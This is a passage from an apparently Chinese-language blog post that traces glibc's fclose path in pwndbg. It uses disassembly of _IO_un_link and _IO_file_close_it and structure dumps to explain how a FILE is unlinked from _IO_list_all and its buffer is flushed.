0x00007ffff7c8d1e4 &lt;+372&gt;:   jne    0x7ffff7c8d2a1 &lt;__GI__IO_un_link+561&gt;</span><br><span class="line">   0x00007ffff7c8d1ea &lt;+378&gt;:   add    rsp,0x38</span><br><span class="line">   0x00007ffff7c8d1ee &lt;+382&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8d1ef &lt;+383&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8d1f0 &lt;+384&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8d1f2 &lt;+386&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8d1f4 &lt;+388&gt;:   ret</span><br><span class="line">   0x00007ffff7c8d1f5 &lt;+389&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8d1f8 &lt;+392&gt;:   mov    rcx,QWORD PTR [rip+0x18e481]        # 0x7ffff7e1b680 &lt;_IO_list_all&gt;</span><br><span class="line">   0x00007ffff7c8d1ff &lt;+399&gt;:   test   rcx,rcx</span><br><span class="line">   0x00007ffff7c8d202 &lt;+402&gt;:   jne    0x7ffff7c8d153 &lt;__GI__IO_un_link+227&gt;</span><br><span class="line">   0x00007ffff7c8d208 &lt;+408&gt;:   and    sil,0x7f</span><br><span class="line">   0x00007ffff7c8d20c &lt;+412&gt;:   mov    DWORD PTR [rbx],esi</span><br><span class="line">   0x00007ffff7c8d20e &lt;+414&gt;:   jmp    0x7ffff7c8d19f &lt;__GI__IO_un_link+303&gt;</span><br><span class="line">   0x00007ffff7c8d210 &lt;+416&gt;:   cmp    rbx,rdx</span><br><span class="line">   0x00007ffff7c8d213 &lt;+419&gt;:   je     0x7ffff7c8d250 &lt;__GI__IO_un_link+480&gt;</span><br><span class="line">   0x00007ffff7c8d215 &lt;+421&gt;:   mov    rcx,rdx</span><br><span class="line">   0x00007ffff7c8d218 &lt;+424&gt;:   mov    rdx,QWORD PTR [rdx+0x68]</span><br><span class="line">   0x00007ffff7c8d21c &lt;+428&gt;:   test   rdx,rdx</span><br><span class="line">   0x00007ffff7c8d21f &lt;+431&gt;:   jne    0x7ffff7c8d210 &lt;__GI__IO_un_link+416&gt;</span><br><span class="line">   0x00007ffff7c8d221 &lt;+433&gt;:   jmp    0x7ffff7c8d167 &lt;__GI__IO_un_link+247&gt;</span><br><span class="line">   0x00007ffff7c8d226 &lt;+438&gt;:   cs nop WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8d230 &lt;+448&gt;:   mov    rcx,QWORD PTR [rip+0x18e449]        # 0x7ffff7e1b680 &lt;_IO_list_all&gt;</span><br><span class="line">   0x00007ffff7c8d237 &lt;+455&gt;:   add    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c8d23b &lt;+459&gt;:   test   rcx,rcx</span><br><span class="line">   0x00007ffff7c8d23e &lt;+462&gt;:   jne    0x7ffff7c8d153 &lt;__GI__IO_un_link+227&gt;</span><br><span class="line">   0x00007ffff7c8d244 &lt;+468&gt;:   and    sil,0x7f</span><br><span class="line">   0x00007ffff7c8d248 &lt;+472&gt;:   mov    DWORD PTR [rbx],esi</span><br><span class="line">   0x00007ffff7c8d24a &lt;+474&gt;:   jmp    0x7ffff7c8d178 &lt;__GI__IO_un_link+264&gt;</span><br><span class="line">   0x00007ffff7c8d24f &lt;+479&gt;:   nop</span><br><span class="line">   0x00007ffff7c8d250 &lt;+480&gt;:   mov    rdx,QWORD PTR [rbx+0x68]</span><br><span class="line">   0x00007ffff7c8d254 &lt;+484&gt;:   and    sil,0x7f</span><br><span class="line">   0x00007ffff7c8d258 &lt;+488&gt;:   add    rcx,0x68</span><br><span class="line">   0x00007ffff7c8d25c &lt;+492&gt;:   mov    QWORD PTR [rcx],rdx</span><br><span class="line">   0x00007ffff7c8d25f &lt;+495&gt;:   mov    DWORD PTR [rbx],esi</span><br><span class="line">   0x00007ffff7c8d261 &lt;+497&gt;:   test   eax,eax</span><br><span class="line">   0x00007ffff7c8d263 &lt;+499&gt;:   je     0x7ffff7c8d171 &lt;__GI__IO_un_link+257&gt;</span><br><span class="line">   0x00007ffff7c8d269 &lt;+505&gt;:   jmp    0x7ffff7c8d196 &lt;__GI__IO_un_link+294&gt;</span><br><span class="line">   0x00007ffff7c8d26e &lt;+510&gt;:   xchg   ax,ax</span><br><span class="line">   0x00007ffff7c8d270 &lt;+512&gt;:   mov    rdi,r12</span><br><span class="line">   0x00007ffff7c8d273 &lt;+515&gt;:   call   0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c8d278 &lt;+520&gt;:   jmp    0x7ffff7c8d0da &lt;__GI__IO_un_link+106&gt;</span><br><span class="line">   0x00007ffff7c8d27d &lt;+525&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8d280 &lt;+528&gt;:   mov    rdi,r12</span><br><span class="line">   0x00007ffff7c8d283 &lt;+531&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c8d288 &lt;+536&gt;:   jmp    0x7ffff7c8d1ce &lt;__GI__IO_un_link+350&gt;</span><br><span class="line">   0x00007ffff7c8d28d &lt;+541&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c8d292 &lt;+546&gt;:   jmp    0x7ffff7c8d196 &lt;__GI__IO_un_link+294&gt;</span><br><span class="line">   0x00007ffff7c8d297 &lt;+551&gt;:   call   0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c8d29c &lt;+556&gt;:   jmp    0x7ffff7c8d12f &lt;__GI__IO_un_link+191&gt;</span><br><span class="line">   0x00007ffff7c8d2a1 &lt;+561&gt;:   call   0x7ffff7d36550 &lt;__stack_chk_fail&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>往下走<br>进行了一些有关线程锁的操作，然后再维护<code>_IO_list_all</code>链表：检查标志位是否包含<code>_IO_LINKED</code>标志，该标志的定义是<code>#define _IO_LINKED 0x80</code>，表示该结构体是否被链接到了<code>_IO_list_all</code>链表中。<br>如果没有<code>_IO_LINKED</code>标志（不在<code>_IO_list_all</code>链表中）或者<code>_IO_list_all</code>链表为空，则直接返回。<br>否则的话即表示结构体为<code>_IO_list_all</code>链表中某个节点，所要做的就是将这个节点取下来，接下来就是单链表的删除节点的操作，首先判断是不是<code>_IO_list_all</code>链表头，如果是的话直接将<code>_IO_list_all</code>指向<code>_IO_list_all-&gt;file._chain</code>就好了，如果不是链表头则遍历链表，找到该结构体，再将其取下。<br>最后返回之前设置<code>_flags</code>为<code>~_IO_LINKED</code>表示该结构体不在<code>_IO_list_all</code>链表中.我们看现在<code>_IO_list_all</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72540026,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b780 &lt;_IO_2_1_stdout_&gt;,</span><br><span class="line">    _fileno = 2,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = -1,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x7ffff7e1ca60 &lt;_IO_stdfile_2_lock&gt;,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x7ffff7e1a8a0 &lt;_IO_wide_data_2&gt;,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$3 = (struct _IO_FILE_plus *) 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure><p>已经变回了<code>_IO_2_1_stderr_</code><br>我们再看我们要关闭的结构体<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$4 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537084,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594d0 &quot;&quot;,</span><br><span class="line">    _IO_write_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其<code>_chain</code>域仍然指向<code>_IO_2_1_stderr_</code>，只是将<code>_IO_list_all</code>指针指向了<code>_IO_2_1_stderr_</code><br>再往下走，接着经过一些检查后就是调用<code>_IO_file_close_it</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ed87 &lt;fclose+279&gt;    mov    rdi, rbp        RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c7ed8a &lt;fclose+282&gt;    call   _IO_file_close_it           &lt;_IO_file_close_it&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_file_close_it:</span><br><span class="line">=&gt; 0x00007ffff7c8be90 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8be94 &lt;+4&gt;:     push   r12</span><br><span class="line">   0x00007ffff7c8be96 &lt;+6&gt;:     push   rbp</span><br><span class="line">   0x00007ffff7c8be97 &lt;+7&gt;:     push   rbx</span><br><span class="line">   0x00007ffff7c8be98 &lt;+8&gt;:     mov    r12d,DWORD PTR [rdi+0x70]</span><br><span class="line">   0x00007ffff7c8be9c &lt;+12&gt;:    cmp    r12d,0xffffffff</span><br><span class="line">   0x00007ffff7c8bea0 &lt;+16&gt;:    je     0x7ffff7c8bf8c &lt;_IO_new_file_close_it+252&gt;</span><br><span class="line">   0x00007ffff7c8bea6 &lt;+22&gt;:    mov    eax,DWORD PTR [rdi]</span><br><span class="line">   0x00007ffff7c8bea8 &lt;+24&gt;:    mov    rbx,rdi</span><br><span class="line">   0x00007ffff7c8beab &lt;+27&gt;:    xor    ebp,ebp</span><br><span class="line">   0x00007ffff7c8bead &lt;+29&gt;:    and    eax,0x808</span><br><span class="line">   0x00007ffff7c8beb2 &lt;+34&gt;:    cmp    eax,0x800</span><br><span class="line">   0x00007ffff7c8beb7 &lt;+39&gt;:    je     0x7ffff7c8bf98 &lt;_IO_new_file_close_it+264&gt;</span><br><span class="line">   0x00007ffff7c8bebd &lt;+45&gt;:    mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8bec0 &lt;+48&gt;:    xor    r12d,r12d</span><br><span class="line">   0x00007ffff7c8bec3 &lt;+51&gt;:    call   0x7ffff7c8f230 &lt;__GI__IO_unsave_markers&gt;</span><br><span class="line">   0x00007ffff7c8bec8 &lt;+56&gt;:    test   BYTE PTR [rbx+0x74],0x20</span><br><span class="line">   0x00007ffff7c8becc &lt;+60&gt;:    jne    0x7ffff7c8bf03 &lt;_IO_new_file_close_it+115&gt;</span><br><span class="line">   0x00007ffff7c8bece &lt;+62&gt;:    mov    r12,QWORD PTR [rbx+0xd8]</span><br><span class="line">   0x00007ffff7c8bed5 &lt;+69&gt;:    lea    rdx,[rip+0x18ab24]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8bedc &lt;+76&gt;:    lea    rax,[rip+0x18b885]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8bee3 &lt;+83&gt;:    sub    rax,rdx</span><br><span class="line">   0x00007ffff7c8bee6 &lt;+86&gt;:    mov    rcx,r12</span><br><span class="line">   0x00007ffff7c8bee9 &lt;+89&gt;:    sub    rcx,rdx</span><br><span class="line">   0x00007ffff7c8beec &lt;+92&gt;:    cmp    rax,rcx</span><br><span class="line">   0x00007ffff7c8beef &lt;+95&gt;:    jbe    0x7ffff7c8bfe0 &lt;_IO_new_file_close_it+336&gt;</span><br><span class="line">   0x00007ffff7c8bef5 &lt;+101&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8bef8 &lt;+104&gt;:   call   QWORD PTR [r12+0x88]</span><br><span class="line">   0x00007ffff7c8bf00 &lt;+112&gt;:   mov    r12d,eax</span><br><span class="line">   0x00007ffff7c8bf03 &lt;+115&gt;:   mov    eax,DWORD PTR [rbx+0xc0]</span><br><span class="line">   0x00007ffff7c8bf09 &lt;+121&gt;:   test   eax,eax</span><br><span class="line">   0x00007ffff7c8bf0b &lt;+123&gt;:   jle    0x7ffff7c8bf47 &lt;_IO_new_file_close_it+183&gt;</span><br><span class="line">   0x00007ffff7c8bf0d &lt;+125&gt;:   mov    rax,QWORD PTR [rbx+0xa0]</span><br><span class="line">   0x00007ffff7c8bf14 &lt;+132&gt;:   cmp    QWORD PTR [rax+0x40],0x0</span><br><span class="line">   0x00007ffff7c8bf19 &lt;+137&gt;:   je     0x7ffff7c8bf23 &lt;_IO_new_file_close_it+147&gt;</span><br><span class="line">   0x00007ffff7c8bf1b &lt;+139&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8bf1e &lt;+142&gt;:   call   0x7ffff7c84340 &lt;__GI__IO_free_wbackup_area&gt;</span><br><span class="line">   0x00007ffff7c8bf23 &lt;+147&gt;:   xor    ecx,ecx</span><br><span class="line">   0x00007ffff7c8bf25 &lt;+149&gt;:   xor    edx,edx</span><br><span class="line">   0x00007ffff7c8bf27 &lt;+151&gt;:   xor    esi,esi</span><br><span class="line">   0x00007ffff7c8bf29 &lt;+153&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8bf2c &lt;+156&gt;:   call   0x7ffff7c83590 &lt;__GI__IO_wsetb&gt;</span><br><span class="line">   0x00007ffff7c8bf31 &lt;+161&gt;:   mov    rax,QWORD PTR [rbx+0xa0]</span><br><span class="line">   0x00007ffff7c8bf38 &lt;+168&gt;:   pxor   xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8bf3c &lt;+172&gt;:   movups XMMWORD PTR [rax],xmm0</span><br><span class="line">   0x00007ffff7c8bf3f &lt;+175&gt;:   movups XMMWORD PTR [rax+0x10],xmm0</span><br><span class="line">   0x00007ffff7c8bf43 &lt;+179&gt;:   movups XMMWORD PTR [rax+0x20],xmm0</span><br><span class="line">   0x00007ffff7c8bf47 &lt;+183&gt;:   xor    ecx,ecx</span><br><span class="line">   0x00007ffff7c8bf49 &lt;+185&gt;:   xor    edx,edx</span><br><span class="line">   0x00007ffff7c8bf4b &lt;+187&gt;:   xor    esi,esi</span><br><span class="line">   0x00007ffff7c8bf4d &lt;+189&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8bf50 &lt;+192&gt;:   call   0x7ffff7c8dc20 &lt;__GI__IO_setb&gt;</span><br><span class="line">   0x00007ffff7c8bf55 &lt;+197&gt;:   pxor   xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8bf59 &lt;+201&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8bf5c &lt;+204&gt;:   movups XMMWORD PTR [rbx+0x8],xmm0</span><br><span class="line">   0x00007ffff7c8bf60 &lt;+208&gt;:   movups XMMWORD PTR [rbx+0x18],xmm0</span><br><span class="line">   0x00007ffff7c8bf64 &lt;+212&gt;:   movups XMMWORD PTR [rbx+0x28],xmm0</span><br><span class="line">   0x00007ffff7c8bf68 &lt;+216&gt;:   call   0x7ffff7c8d2b0 &lt;__GI__IO_un_link&gt;</span><br><span class="line">   0x00007ffff7c8bf6d &lt;+221&gt;:   test   r12d,r12d</span><br><span class="line">   0x00007ffff7c8bf70 &lt;+224&gt;:   mov    DWORD PTR [rbx],0xfbad240c</span><br><span class="line">   0x00007ffff7c8bf76 &lt;+230&gt;:   mov    DWORD PTR [rbx+0x70],0xffffffff</span><br><span class="line">   0x00007ffff7c8bf7d &lt;+237&gt;:   cmove  r12d,ebp</span><br><span class="line">   0x00007ffff7c8bf81 &lt;+241&gt;:   mov    QWORD PTR [rbx+0x90],0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8bf8c &lt;+252&gt;:   mov    eax,r12d</span><br><span class="line">   0x00007ffff7c8bf8f &lt;+255&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8bf90 &lt;+256&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8bf91 &lt;+257&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8bf93 &lt;+259&gt;:   ret</span><br><span class="line">   0x00007ffff7c8bf94 &lt;+260&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8bf98 &lt;+264&gt;:   mov    edx,DWORD PTR [rdi+0xc0]</span><br><span class="line">   0x00007ffff7c8bf9e &lt;+270&gt;:   test   edx,edx</span><br><span class="line">   0x00007ffff7c8bfa0 &lt;+272&gt;:   jle    0x7ffff7c8bfc8 &lt;_IO_new_file_close_it+312&gt;</span><br><span class="line">   0x00007ffff7c8bfa2 &lt;+274&gt;:   mov    rax,QWORD PTR [rdi+0xa0]</span><br><span class="line">   0x00007ffff7c8bfa9 &lt;+281&gt;:   mov    rsi,QWORD PTR [rax+0x18]</span><br><span class="line">   0x00007ffff7c8bfad &lt;+285&gt;:   mov    rdx,QWORD PTR [rax+0x20]</span><br><span class="line">   0x00007ffff7c8bfb1 &lt;+289&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8bfb4 &lt;+292&gt;:   sar    rdx,0x2</span><br><span class="line">   0x00007ffff7c8bfb8 &lt;+296&gt;:   call   0x7ffff7c861a0 &lt;__GI__IO_wdo_write&gt;</span><br><span class="line">   0x00007ffff7c8bfbd &lt;+301&gt;:   mov    ebp,eax</span><br><span class="line">   0x00007ffff7c8bfbf &lt;+303&gt;:   jmp    0x7ffff7c8bebd &lt;_IO_new_file_close_it+45&gt;</span><br><span class="line">   0x00007ffff7c8bfc4 &lt;+308&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8bfc8 &lt;+312&gt;:   mov    rsi,QWORD PTR [rdi+0x20]</span><br><span class="line">   0x00007ffff7c8bfcc &lt;+316&gt;:   mov    rdx,QWORD PTR [rdi+0x28]</span><br><span class="line">   0x00007ffff7c8bfd0 &lt;+320&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8bfd3 &lt;+323&gt;:   call   0x7ffff7c8c930 &lt;_IO_new_do_write&gt;</span><br><span class="line">   0x00007ffff7c8bfd8 &lt;+328&gt;:   mov    ebp,eax</span><br><span class="line">   0x00007ffff7c8bfda &lt;+330&gt;:   jmp    0x7ffff7c8bebd &lt;_IO_new_file_close_it+45&gt;</span><br><span class="line">   0x00007ffff7c8bfdf &lt;+335&gt;:   nop</span><br><span class="line">   0x00007ffff7c8bfe0 &lt;+336&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8bfe5 &lt;+341&gt;:   jmp    0x7ffff7c8bef5 &lt;_IO_new_file_close_it+101&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>我们接着走<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8be90 &lt;_IO_file_close_it&gt;       endbr64</span><br><span class="line">0x7ffff7c8be94 &lt;_IO_file_close_it+4&gt;     push   r12</span><br><span class="line">0x7ffff7c8be96 &lt;_IO_file_close_it+6&gt;     push   rbp</span><br><span class="line">0x7ffff7c8be97 &lt;_IO_file_close_it+7&gt;     push   rbx</span><br><span class="line">0x7ffff7c8be98 &lt;_IO_file_close_it+8&gt;     mov    r12d, dword ptr [rdi + 0x70]     R12D, [0x555555559310] =&gt; 3</span><br><span class="line">0x7ffff7c8be9c &lt;_IO_file_close_it+12&gt;    cmp    r12d, -1                         3 - -1     EFLAGS =&gt; 0x213 [ CF pf AF zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8bea0 &lt;_IO_file_close_it+16&gt;  ✘ je     _IO_file_close_it+252       &lt;_IO_file_close_it+252&gt;</span><br></pre></td></tr></table></figure><p>这里是判断文件处于打开状态，直接比较<code>_fileno</code>域，确保不是-1<br>否则直接返回<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c8bf8c &lt;+252&gt;:   mov    eax,r12d</span><br><span class="line">0x00007ffff7c8bf8f &lt;+255&gt;:   pop    rbx</span><br><span class="line">0x00007ffff7c8bf90 &lt;+256&gt;:   pop    rbp</span><br><span class="line">0x00007ffff7c8bf91 &lt;+257&gt;:   pop    r12</span><br><span class="line">0x00007ffff7c8bf93 &lt;+259&gt;:   ret</span><br></pre></td></tr></table></figure><p>接着判断是不是输出缓冲区<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bea6 &lt;_IO_file_close_it+22&gt;     mov    eax, dword ptr [rdi]             EAX, [0x5555555592a0] =&gt; 0xfbad2c04</span><br><span class="line">0x7ffff7c8bea8 &lt;_IO_file_close_it+24&gt;     mov    rbx, rdi                         RBX =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c8beab &lt;_IO_file_close_it+27&gt;     xor    ebp, ebp                         EBP =&gt; 0</span><br><span class="line">0x7ffff7c8bead &lt;_IO_file_close_it+29&gt;     and    eax, 0x808                       EAX =&gt; 0x800 (0xfbad2c04 &amp; 0x808)</span><br><span class="line">0x7ffff7c8beb2 &lt;_IO_file_close_it+34&gt;     cmp    eax, 0x800                       0x800 - 0x800     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8beb7 &lt;_IO_file_close_it+39&gt;   ✔ je     _IO_file_close_it+264       &lt;_IO_file_close_it+264&gt;</span><br></pre></td></tr></table></figure><p>如果是的话（我们这里是），则调用<code>_IO_do_flush</code>刷新此时的输出缓冲区，<code>_IO_do_flush</code>也是一个宏定义<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line"># define _IO_do_flush(_f) \</span><br><span class="line">  ((_f)-&gt;_mode &lt;= 0                               \</span><br><span class="line">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                   \</span><br><span class="line">          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)           \</span><br><span class="line">   : _IO_wdo_write(_f, 